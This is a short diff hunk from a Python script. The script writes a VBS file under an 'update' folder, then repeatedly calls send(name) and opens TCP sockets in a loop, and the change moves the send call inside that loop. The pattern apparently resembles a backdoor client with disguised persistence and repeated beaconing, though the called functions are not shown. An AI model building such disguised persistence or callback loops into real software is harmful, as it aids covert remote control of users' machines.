@@ -65,9 +65,9 @@ if __name__ == "__main__":
     vbs_path = r"C:\Tools\update\update.vbs"
     if not os.path.exists(vbs_path):
         create_vbs(vbs_path)
-    send(name)
     flag = True
     while flag:
+        send(name)
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.settimeout(3.0)
             try: 
